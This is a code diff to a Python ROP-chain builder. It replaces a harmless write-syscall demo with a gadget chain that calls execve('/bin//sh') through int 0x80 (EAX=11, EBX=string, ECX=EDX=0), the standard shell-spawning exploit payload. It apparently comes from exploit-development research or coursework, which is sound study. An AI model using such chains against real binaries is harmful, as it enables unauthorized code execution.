@@ -47,7 +47,7 @@
 import itertools
 import sys
 
-class Assembler_revisited:
+class Stage:
 
     def __init__(self, gadgets, memory):
 
@@ -68,20 +68,20 @@ class Assembler_revisited:
         #  TODO:    Function to determain order of fake stak popping.
         #  
 
-        string = "Hej_lille_verden"
+        string = "/bin//sh"
         self.buildFakeStack( self.suitableGadget(self.catalog['INT']['0x80'], []), None )        
 
         val, gadget = self.fake_pop('EBX')
-        self.buildFakeStack( self.suitableGadget(gadget, []), 1 )   
+        self.buildFakeStack( self.suitableGadget(gadget, []), string )   
 
         val, gadget = self.fake_pop('EDX')
-        self.buildFakeStack( self.suitableGadget(gadget, []), len(string) )      
+        self.buildFakeStack( self.suitableGadget(gadget, []), 0 )      
 
         val, gadget = self.fake_pop('ECX')
-        self.buildFakeStack( self.suitableGadget(gadget, []), string )
+        self.buildFakeStack( self.suitableGadget(gadget, []), 0 )
 
         val, gadget = self.fake_pop('EAX')
-        self.buildFakeStack( self.suitableGadget(gadget, []), 4 )
+        self.buildFakeStack( self.suitableGadget(gadget, []), 11 )
 
 
         ( val, chain ) = self.store_data('0xdeadbeef', True)
